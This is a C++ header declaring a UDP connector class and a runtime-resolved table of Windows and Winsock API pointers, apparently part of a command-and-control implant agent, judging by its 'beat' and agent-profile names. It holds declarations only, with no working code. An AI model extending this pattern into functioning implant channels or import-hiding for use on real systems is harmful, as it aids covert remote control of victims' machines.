#pragma once

#include <windows.h>

#include "AgentConfig.h"

#define DECL_API(x) decltype(x) * x

struct UDPFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetProcAddress);
	DECL_API(GetLastError);
	DECL_API(GetTickCount);

	//ws2_32
	DECL_API(WSAStartup);
	DECL_API(WSACleanup);
	DECL_API(socket);
	DECL_API(ioctlsocket);
	DECL_API(WSAGetLastError);
	DECL_API(closesocket);
	DECL_API(select);
	DECL_API(__WSAFDIsSet);
	DECL_API(shutdown);
	DECL_API(recvfrom);
	DECL_API(sendto);
	DECL_API(bind);
};

class ConnectorUDP
{
	WORD  port = 0;
	BYTE* prepend = NULL;

	BYTE* recvData = NULL;
	int   recvSize = 0;
	ULONG allocaSize = 0;

	UDPFUNC* functions = NULL;

	SOCKET ClientSocket;
	struct sockaddr_in ServerAddr;
	int ServerAddrLen;

public:
	ConnectorUDP();

	BOOL SetConfig(ProfileUDP profile, BYTE* beat, ULONG beatSize);

	void Listen();
	void Disconnect();
	void CloseConnector();

	void  SendData(BYTE* data, ULONG data_size);
	BYTE* RecvData();
	int   RecvSize();
	void  RecvClear();

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};
